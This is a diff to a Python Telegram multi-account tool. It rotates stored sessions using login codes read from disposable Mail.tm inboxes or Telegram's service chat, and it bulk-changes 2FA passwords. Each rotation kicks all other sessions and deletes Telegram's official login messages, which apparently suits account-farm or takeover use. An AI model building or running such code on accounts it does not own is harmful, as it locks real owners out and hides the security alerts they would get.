@@ -1129,43 +1129,139 @@ async def kick_specific_session(phone: str, session_hash: int) -> bool:
         return False
 
 
-async def rotate_session(phone: str) -> dict:
+async def _rotate_via_email(phone: str, row, login_email: str, email_password: str) -> dict:
     """
-    تغيير الجلسة بالكامل — الكود يُطلب بالطريقة العادية ويُقرأ من 777000 عبر الجلسة القديمة:
+    تغيير الجلسة باستخدام بريد Mail.tm المربوط — أكثر موثوقية من قراءة شات التيليجرام.
     1. فتح الجلسة القديمة وجلب hashes الجلسات الأخرى
-    2. تصوير آخر رسالة في 777000 (حتى لا نقرأ كوداً قديماً)
-    3. طلب كود دخول جديد من client_new (يصل لشات التيليجرام كرسالة)
-    4. قراءة الكود من 777000 عبر client_old (الجلسة المسجّلة)
+    2. تصوير صندوق Mail.tm قبل طلب الكود
+    3. طلب كود دخول من client_new مع إعادة إرسال حتى Email delivery
+    4. قراءة الكود من Mail.tm
     5. تسجيل الدخول بـ client_new
     6. حفظ الجلسة الجديدة في DB
     7. طرد الجلسات الأخرى القديمة بـ client_old
     8. تسجيل خروج client_old نفسها
     """
-    row = await database.get_session_by_phone(phone)
-    if not row:
-        return {"success": False, "error": "الجلسة غير موجودة"}
-
     client_old = None
     client_new = None
-
     try:
-        # 1. فتح الجلسة القديمة
+        # التحقق من صندوق Mail.tm
+        if not await mailtm.verify_mailbox(login_email, email_password):
+            return {"success": False, "error": f"فشل الوصول لصندوق Mail.tm: {login_email}"}
+
+        # 1. فتح الجلسة القديمة وجلب hashes الجلسات الأخرى
         client_old = await get_active_client(phone)
         if not client_old:
             return {"success": False, "error": "الجلسة غير متصلة حالياً"}
 
-        # جلب hashes الجلسات الأخرى (قبل إنشاء الجديدة)
         other_hashes = []
         try:
             auths_result = await client_old(GetAuthorizationsRequest())
             other_hashes = [a.hash for a in auths_result.authorizations if not a.current]
-            logger.info("rotate_session %s: found %d other sessions", phone, len(other_hashes))
+            logger.info("rotate_email %s: found %d other sessions", phone, len(other_hashes))
         except Exception as e:
-            logger.warning("rotate_session get_auths %s: %s", phone, e)
+            logger.warning("rotate_email get_auths %s: %s", phone, e)
 
-        # 2. تصوير آخر رسالة في 777000 و 42777 — نحفظ (id, text) معاً
-        #    الكود أحياناً يصل كـ EDIT على رسالة قائمة (نفس id، نص مختلف)
-        #    لذلك نقارن كلاً من id والنص
+        # 2. تصوير صندوق Mail.tm قبل طلب الكود
+        exclude_ids = await mailtm.snapshot_message_ids(login_email, email_password)
+
+        # 3. إنشاء client_new وطلب كود عبر Email delivery
+        client_new = make_telegram_client()
+        await client_new.connect()
+
+        phone_code_hash, delivery = await _request_login_code_via_email(client_new, phone)
+        logger.info("rotate_email %s: code delivery=%s", phone, delivery)
+
+        # 4. قراءة الكود من Mail.tm
+        code: str | None = None
+        if "Email" in delivery:
+            raw_codes = await fetch_codes_from_email(
+                login_email, email_password,
+                attempts=36, interval=5,
+                exclude_ids=exclude_ids,
+            )
+            for raw in raw_codes:
+                c = _normalize_login_code(raw)
+                if c:
+                    code = c
+                    break
+
+        if not code:
+            return {
+                "success": False,
+                "error": f"لم يصل الكود للبريد {login_email} (نوع التوصيل: {delivery})",
+            }
+
+        logger.info("rotate_email %s: got code from Mail.tm", phone)
+
+        # 5. تسجيل الدخول بالجلسة الجديدة
+        try:
+            await client_new.sign_in(phone, code, phone_code_hash=phone_code_hash)
+        except SessionPasswordNeededError:
+            two_fa = (row["two_fa"] or DEFAULT_2FA_PASSWORD or "").strip()
+            if not two_fa:
+                return {"success": False, "error": "الحساب محمي بـ 2FA غير محفوظ في DB"}
+            await client_new.sign_in(password=two_fa)
+
+        session_new = client_new.session.save()
+        logger.info("rotate_email %s: new session obtained", phone)
+
+        # 6. حفظ الجلسة الجديدة في DB قبل أي طرد
+        await database.update_session_string(phone, session_new)
+        logger.info("rotate_email %s: DB updated with new session", phone)
+
+        # 7. طرد الجلسات الأخرى القديمة باستخدام client_old
+        for h in other_hashes:
+            try:
+                await client_old(ResetAuthorizationRequest(hash=h))
+                logger.debug("rotate_email %s: kicked hash %s", phone, h)
+            except Exception as e:
+                logger.debug("rotate_email kick hash %s for %s: %s", h, phone, e)
+
+        # 8. تسجيل خروج الجلسة القديمة نفسها
+        try:
+            await client_old(LogOutRequest())
+            logger.info("rotate_email %s: old session logged out", phone)
+        except Exception as e:
+            logger.debug("rotate_email logout old %s: %s", phone, e)
+
+        # حذف رسائل كود الدخول من الجلسة الجديدة
+        try:
+            await delete_telegram_official_messages(client_new)
+        except Exception:
+            pass
+
+        return {"success": True}
+
+    except Exception as e:
+        logger.error("rotate_email %s: %s", phone, e)
+        return {"success": False, "error": str(e)}
+    finally:
+        for c in (client_new, client_old):
+            if c:
+                try:
+                    await c.disconnect()
+                except Exception:
+                    pass
+
+
+async def _rotate_via_telegram_chat(phone: str, row) -> dict:
+    """
+    تغيير الجلسة بقراءة الكود من شات التيليجرام (777000) — بديل عند عدم وجود بريد.
+    """
+    client_old = None
+    client_new = None
+    try:
+        client_old = await get_active_client(phone)
+        if not client_old:
+            return {"success": False, "error": "الجلسة غير متصلة حالياً"}
+
+        other_hashes = []
+        try:
+            auths_result = await client_old(GetAuthorizationsRequest())
+            other_hashes = [a.hash for a in auths_result.authorizations if not a.current]
+        except Exception as e:
+            logger.warning("rotate_chat get_auths %s: %s", phone, e)
+
         snapshot: dict[int, tuple[int, str]] = {}
         for sender_id in OFFICIAL_SENDERS:
             try:
@@ -1177,16 +1273,14 @@ async def rotate_session(phone: str) -> dict:
             except Exception:
                 snapshot[sender_id] = (0, "")
 
-        # 3. إنشاء client_new (جلسة فارغة) وطلب كود — الكود سيصل للتيليجرام
         client_new = make_telegram_client()
         await client_new.connect()
 
         sent = await _send_login_code_request(client_new, phone)
         phone_code_hash = sent.phone_code_hash
         delivery_type = type(sent.type).__name__
-        logger.info("rotate_session %s: code requested, type=%s", phone, delivery_type)
+        logger.info("rotate_chat %s: code requested, type=%s", phone, delivery_type)
 
-        # إذا وصل الكود عبر SMS فلن يظهر في شات التيليجرام — أعد الإرسال مرة أو مرتين
         norm_phone = database.normalize_phone(phone)
         if "App" not in delivery_type and "Telegram" not in delivery_type:
             for _resend in range(3):
@@ -1195,19 +1289,16 @@ async def rotate_session(phone: str) -> dict:
                     resent = await client_new(ResendCodeRequest(norm_phone, phone_code_hash))
                     phone_code_hash = resent.phone_code_hash
                     delivery_type = type(resent.type).__name__
-                    logger.info("rotate_session %s resend %d: type=%s", phone, _resend + 1, delivery_type)
                     if "App" in delivery_type or "Telegram" in delivery_type:
                         break
                 except FloodWaitError as fw:
                     await asyncio.sleep(min(fw.seconds + 1, 60))
                 except Exception as e:
-                    logger.debug("rotate_session resend %s: %s", phone, e)
+                    logger.debug("rotate_chat resend %s: %s", phone, e)
 
-        # 4. قراءة الكود من شات التيليجرام (777000 أو 42777) عبر client_old
-        #    نتحقق من: رسالة جديدة (id أعلى) أو رسالة مُحرَّرة (نفس id، نص مختلف)
         code_text: str | None = None
         loop = asyncio.get_running_loop()
-        deadline = loop.time() + 180  # انتظار 3 دقائق كحد أقصى
+        deadline = loop.time() + 180
         while loop.time() < deadline:
             await asyncio.sleep(3)
             for sender_id, (last_id, last_text) in list(snapshot.items()):
@@ -1220,17 +1311,12 @@ async def rotate_session(phone: str) -> dict:
                         is_edited_msg = msg.id == last_id and msg.text != last_text
                         if (is_new_msg or is_edited_msg) and CODE_PATTERN.search(msg.text):
                             code_text = msg.text
-                            logger.info(
-                                "rotate_session %s: found code in %s (new=%s edited=%s)",
-                                phone, sender_id, is_new_msg, is_edited_msg,
-                            )
                             break
-                    # حدّث الـ snapshot بأحدث رسالة
                     if new_msgs:
                         top = new_msgs[0]
                         snapshot[sender_id] = (max(last_id, top.id), top.text or "")
                 except Exception as e:
-                    logger.debug("rotate_session poll %s %s: %s", phone, sender_id, e)
+                    logger.debug("rotate_chat poll %s %s: %s", phone, sender_id, e)
                 if code_text:
                     break
             if code_text:
@@ -1246,9 +1332,6 @@ async def rotate_session(phone: str) -> dict:
         if not code:
             return {"success": False, "error": f"كود غير قابل للقراءة: {code_text[:50]}"}
 
-        logger.info("rotate_session %s: got code from Telegram chat", phone)
-
-        # 5. تسجيل الدخول بالجلسة الجديدة
         try:
             await client_new.sign_in(phone, code, phone_code_hash=phone_code_hash)
         except SessionPasswordNeededError:
@@ -1258,28 +1341,19 @@ async def rotate_session(phone: str) -> dict:
             await client_new.sign_in(password=two_fa)
 
         session_new = client_new.session.save()
-        logger.info("rotate_session %s: new session obtained", phone)
-
-        # 6. حفظ الجلسة الجديدة في DB قبل أي طرد
         await database.update_session_string(phone, session_new)
-        logger.info("rotate_session %s: DB updated with new session", phone)
 
-        # 7. طرد الجلسات الأخرى القديمة باستخدام client_old
         for h in other_hashes:
             try:
                 await client_old(ResetAuthorizationRequest(hash=h))
-                logger.debug("rotate_session %s: kicked hash %s", phone, h)
             except Exception as e:
-                logger.debug("rotate_session kick hash %s for %s: %s", h, phone, e)
+                logger.debug("rotate_chat kick hash %s for %s: %s", h, phone, e)
 
-        # 8. تسجيل خروج الجلسة القديمة نفسها
         try:
             await client_old(LogOutRequest())
-            logger.info("rotate_session %s: old session logged out", phone)
         except Exception as e:
-            logger.debug("rotate_session logout old %s: %s", phone, e)
+            logger.debug("rotate_chat logout old %s: %s", phone, e)
 
-        # حذف رسائل كود الدخول من الجلسة الجديدة
         try:
             await delete_telegram_official_messages(client_new)
         except Exception:
@@ -1288,44 +1362,92 @@ async def rotate_session(phone: str) -> dict:
         return {"success": True}
 
     except Exception as e:
-        logger.error("rotate_session %s: %s", phone, e)
+        logger.error("rotate_chat %s: %s", phone, e)
         return {"success": False, "error": str(e)}
-
     finally:
-        if client_new:
-            try:
-                await client_new.disconnect()
-            except Exception:
-                pass
-        if client_old:
-            try:
-                await client_old.disconnect()
-            except Exception:
-                pass
+        for c in (client_new, client_old):
+            if c:
+                try:
+                    await c.disconnect()
+                except Exception:
+                    pass
 
 
-async def bulk_rotate_sessions() -> dict:
+async def rotate_session(phone: str) -> dict:
     """
-    تغيير جلسات كل الحسابات المتصلة.
-    يتخطى الحسابات غير المتصلة فقط.
+    تغيير الجلسة بالكامل:
+    - إذا كان للحساب بريد Mail.tm مربوط: يُستخدم لاستلام الكود (أكثر موثوقية)
+    - وإلا: يُقرأ الكود من شات التيليجرام (777000) عبر الجلسة القديمة
+    في كلتا الحالتين: طرد الجلسات الأخرى + تسجيل خروج الجلسة القديمة.
+    """
+    row = await database.get_session_by_phone(phone)
+    if not row:
+        return {"success": False, "error": "الجلسة غير موجودة"}
+
+    login_email = database.row_login_email(row)
+    email_password = database.row_get(row, "email_password")
+    has_email = bool(
+        login_email
+        and email_password
+        and not database.is_legacy_login_email(login_email)
+    )
+
+    if has_email:
+        logger.info("rotate_session %s: using Mail.tm email delivery", phone)
+        return await _rotate_via_email(phone, row, login_email, email_password)
+    else:
+        logger.info("rotate_session %s: using Telegram chat fallback", phone)
+        return await _rotate_via_telegram_chat(phone, row)
+
+
+async def bulk_rotate_sessions(
+    progress_cb=None,
+    should_stop=None,
+) -> dict:
+    """
+    تغيير جلسات كل الحسابات الصالحة والمتصلة.
+    - يتخطى الجلسات المعطلة (valid=0) والجلسات غير المتصلة.
+    - progress_cb: coroutine يُستدعى بعد كل حساب (done, total, success, fail, skip)
+    - should_stop: callable يُرجع True لإيقاف العملية
     """
     sessions = await database.get_all_sessions()
+    total = len(sessions)
     success_count = 0
     fail_count = 0
     skip_count = 0
     fail_details = []
+    done = 0
 
     for s in sessions:
         phone = s["phone"]
 
+        # توقف إذا طُلب
+        if should_stop and should_stop():
+            remaining = total - done
+            skip_count += remaining
+            break
+
+        # تخطي الجلسات المعطلة
+        if not s["valid"]:
+            skip_count += 1
+            done += 1
+            if progress_cb:
+                await progress_cb(done, total, success_count, fail_count, skip_count)
+            continue
+
+        # تخطي الجلسات غير المتصلة
         alive = await check_session_alive(phone)
         if not alive:
             skip_count += 1
+            done += 1
             logger.info("bulk_rotate skip %s: not alive", phone)
+            if progress_cb:
+                await progress_cb(done, total, success_count, fail_count, skip_count)
             continue
 
         logger.info("bulk_rotate processing %s", phone)
         res = await rotate_session(phone)
+        done += 1
         if res["success"]:
             success_count += 1
             logger.info("bulk_rotate success %s", phone)
@@ -1334,36 +1456,69 @@ async def bulk_rotate_sessions() -> dict:
             fail_details.append(f"{phone}: {res.get('error', '')}")
             logger.warning("bulk_rotate fail %s: %s", phone, res.get("error"))
 
+        if progress_cb:
+            await progress_cb(done, total, success_count, fail_count, skip_count)
+
         await asyncio.sleep(3)
 
     return {
         "success": success_count,
         "fail": fail_count,
         "skip": skip_count,
-        "total": len(sessions),
+        "total": total,
         "fail_details": fail_details,
     }
 
 
-async def bulk_change_two_fa(new_password: str) -> dict:
+async def bulk_change_two_fa(
+    new_password: str,
+    progress_cb=None,
+    should_stop=None,
+) -> dict:
     """
-    تغيير التحقق بخطوتين لكل الحسابات التي لها two_fa محفوظ في DB.
+    تغيير التحقق بخطوتين لكل الحسابات الصالحة والمتصلة التي لها two_fa في DB.
+    - يتخطى الجلسات المعطلة (valid=0) والجلسات غير المتصلة.
+    - progress_cb: coroutine يُستدعى بعد كل حساب (done, total, success, fail, skip)
+    - should_stop: callable يُرجع True لإيقاف العملية
     """
     sessions = await database.get_all_sessions()
+    total = len(sessions)
     success_count = 0
     fail_count = 0
     skip_count = 0
     fail_details = []
+    done = 0
 
     for s in sessions:
         phone = s["phone"]
         old_2fa = s["two_fa"]
 
-        if not old_2fa:
+        # توقف إذا طُلب
+        if should_stop and should_stop():
+            remaining = total - done
+            skip_count += remaining
+            break
+
+        # تخطي الجلسات المعطلة (valid=0) أو بلا تحقق
+        if not s["valid"] or not old_2fa:
             skip_count += 1
+            done += 1
+            if progress_cb:
+                await progress_cb(done, total, success_count, fail_count, skip_count)
+            continue
+
+        # تخطي الجلسات غير المتصلة
+        alive = await check_session_alive(phone)
+        if not alive:
+            skip_count += 1
+            done += 1
+            logger.info("bulk_2fa skip %s: not alive", phone)
+            if progress_cb:
+                await progress_cb(done, total, success_count, fail_count, skip_count)
             continue
 
         res = await set_two_fa(phone, new_password, old_2fa)
+        done += 1
         if res["success"]:
             success_count += 1
             logger.info("bulk_change_2fa success %s", phone)
@@ -1372,13 +1527,16 @@ async def bulk_change_two_fa(new_password: str) -> dict:
             fail_details.append(f"{phone}: {res.get('error', '')}")
             logger.warning("bulk_change_2fa fail %s: %s", phone, res.get("error"))
 
+        if progress_cb:
+            await progress_cb(done, total, success_count, fail_count, skip_count)
+
         await asyncio.sleep(1)
 
     return {
         "success": success_count,
         "fail": fail_count,
         "skip": skip_count,
-        "total": len(sessions),
+        "total": total,
         "fail_details": fail_details,
     }
 
